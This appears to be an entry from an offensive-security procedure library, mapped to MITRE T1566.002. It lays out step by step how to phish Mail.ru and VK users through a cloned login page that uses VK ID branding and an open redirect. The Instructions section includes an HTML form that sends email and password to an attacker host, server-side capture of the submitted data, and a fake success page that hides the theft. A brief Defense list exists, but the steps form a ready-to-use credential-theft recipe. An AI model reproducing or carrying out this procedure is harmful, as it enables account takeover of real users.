---
id: 123e4567-e89b-12d3-a456-426614174002
name: Phishing-via-VK-ID-Integrated-Login
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.242Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Phishing]]'
sub_techniques:
  - '[[T1566.002]]'
tags:
  - phishing
  - vk-id
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Phishing]]'
---

# Phishing-via-VK-ID-Integrated-Login

## Summary

This procedure leverages the visual and functional integration of VK ID in Mail.ru's login page to create convincing phishing sites that trick users into entering credentials, exploiting embedded external elements like VK user photos for authenticity.

## Description

Mail.ru's login interface incorporates VK ID for social authentication, pulling in elements such as user profile photos from VK's domains (e.g., vk.com or api.vk.com). Attackers can replicate this on a phishing site, using the same external image sources and styling to mimic legitimacy. When combined with an open redirect, users arrive post-authentication believing they are still on Mail.ru. The fake page captures credentials, VK tokens, or session data. This targets users familiar with VK-Mail.ru ecosystem, with outcomes including account takeover on linked services.

## Requirements

1. Hosting for a phishing site that can embed external VK resources (e.g., images from vk.com)
2. Basic web development skills to clone Mail.ru/VK login UI
3. Integration with a backend to capture and store submitted credentials

## Defense

Defensive measures and detection strategies:

- Educate users on verifying URLs and avoiding unsolicited login prompts
- Implement multi-factor authentication (MFA) to mitigate credential theft
- Use browser extensions or security software to detect phishing domains mimicking trusted sites
- Monitor for unauthorized external resource loads in login flows

## Objectives

1. Deceive users into providing Mail.ru or VK credentials on a fake page
2. Capture authentication data for account compromise
3. Exploit trust in integrated social login providers

## Instructions

### Step 1: Clone Legitimate Login Interface

**Context**: Replicate the Mail.ru login page with VK ID elements to build user confidence.

Download and modify the HTML/CSS/JS from https://account.mail.ru/login, focusing on VK integration. Embed real VK photo URLs (e.g., <img src="https://vk.com/photo-userid">) to load authentic images.

### Step 2: Set Up Credential Capture

**Context**: Configure the fake form to submit data to attacker's server instead of Mail.ru.

Modify the login form's action attribute:

```html
<form action="https://attacker.com/capture" method="POST">
  <input type="email" name="email" placeholder="Mail.ru email">
  <input type="password" name="password" placeholder="Password">
  <!-- VK ID button mimicking social login -->
</form>
```

Implement server-side logging to store POST data.

### Step 3: Integrate with Redirect and Test

**Context**: Ensure the phishing page loads seamlessly after redirect and captures inputs.

Test by simulating the full flow: Access a redirect URL, "log in" on the fake page, and verify credentials are captured without alerting the user (e.g., show a fake success page).

**Expected Output**: Submitted credentials logged on attacker's server, with user redirected to a benign page.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Phishing]] Phishing

### Sub-Techniques

- [[T1566.002]] Spearphishing Link

## Commands Used


## Tools Used


## Tags

- phishing
- vk-id
